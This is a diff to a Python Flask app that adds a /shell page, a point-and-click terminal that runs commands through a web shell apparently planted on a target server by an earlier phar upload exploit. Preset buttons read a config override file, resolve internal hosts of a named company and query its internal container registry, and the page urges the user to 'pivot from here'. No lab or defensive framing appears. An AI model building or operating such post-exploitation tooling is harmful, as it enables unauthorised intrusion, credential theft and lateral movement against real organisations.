@@ -350,6 +350,65 @@ def serve_upload(fname):
     return send_from_directory(UPLOAD_DIR, fname)
 
 
+# --------------------------- clickable browser terminal over the web-shell ---
+# Only useful once the phar step (5) has dropped /upload/shell.php; it simply
+# drives the same shell.php?z=<base64> exec endpoint from a point-and-click UI.
+_TERM = """<!doctype html><html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1"><title>sh</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#0b0f12;color:#c8f7c5;font-family:'JetBrains Mono',ui-monospace,Menlo,Consolas,monospace;
+     min-height:100vh;padding:18px}
+h1{font-size:14px;color:#7fe08a;margin-bottom:4px}
+.muted{color:#5c6b63;font-size:12px;margin-bottom:14px}
+#out{white-space:pre-wrap;background:#05080a;border:1px solid #16351f;border-radius:6px;
+     padding:12px;min-height:300px;font-size:13px;overflow:auto}
+.row{display:flex;gap:8px;margin-top:10px}
+#cmd{flex:1;background:#05080a;border:1px solid #2a4a33;border-radius:5px;color:#c8f7c5;
+     padding:10px 12px;font:inherit}
+button{background:#1f8a3b;color:#fff;border:none;border-radius:5px;padding:10px 16px;
+     font-weight:600;cursor:pointer}button:hover{background:#27a94a}
+.chips{margin-top:10px}.chip{display:inline-block;background:#13261a;border:1px solid #2a4a33;
+     border-radius:3px;padding:3px 9px;margin:3px 4px 0 0;cursor:pointer;color:#9fe0ab;font-size:12px}
+.prompt{color:#7fe08a}
+</style></head><body>
+<h1>sp-web-p01 — www-data shell</h1>
+<div class="muted">Runs commands through the dropped web-shell (/upload/shell.php). Pivot from here.</div>
+<div id="out">$ id
+(type a command and press Run)</div>
+<div class="row"><span class="prompt" style="align-self:center">$</span>
+  <input id="cmd" autofocus spellcheck="false" placeholder="id; hostname; id">
+  <button onclick="run()">Run</button></div>
+<div class="chips">
+  <span class="chip" onclick="setcmd('id; hostname')">id; hostname</span>
+  <span class="chip" onclick="setcmd('cat /var/www/config_override.php')">read config_override.php</span>
+  <span class="chip" onclick="setcmd('ls -la /app/upload')">ls upload</span>
+  <span class="chip" onclick="setcmd('getent hosts grafana.atbmarket.com zb-app-p01 harbor.atbmarket.com')">resolve internal hosts</span>
+  <span class="chip" onclick="setcmd('curl -s http://harbor.atbmarket.com/v2/_catalog')">curl harbor</span>
+</div>
+<script>
+const out=document.getElementById('out'),cmd=document.getElementById('cmd');
+function setcmd(c){cmd.value=c;cmd.focus();}
+async function run(){
+  const c=cmd.value.trim(); if(!c)return;
+  out.textContent+='\\n\\n$ '+c+'\\n';
+  try{
+    const r=await fetch('/upload/shell.php?z='+encodeURIComponent(btoa(c)));
+    out.textContent += (r.status===404)
+      ? '[web-shell not dropped yet — complete the phar upload step first]'
+      : await r.text();
+  }catch(e){out.textContent+='[error] '+e;}
+  out.scrollTop=out.scrollHeight; cmd.value='';
+}
+cmd.addEventListener('keydown',e=>{if(e.key==='Enter')run();});
+</script></body></html>"""
+
+
+@app.get("/shell")
+def shell_term():
+    return html(_TERM)
+
+
 @app.get("/healthz")
 def healthz():
     return "ok", 200
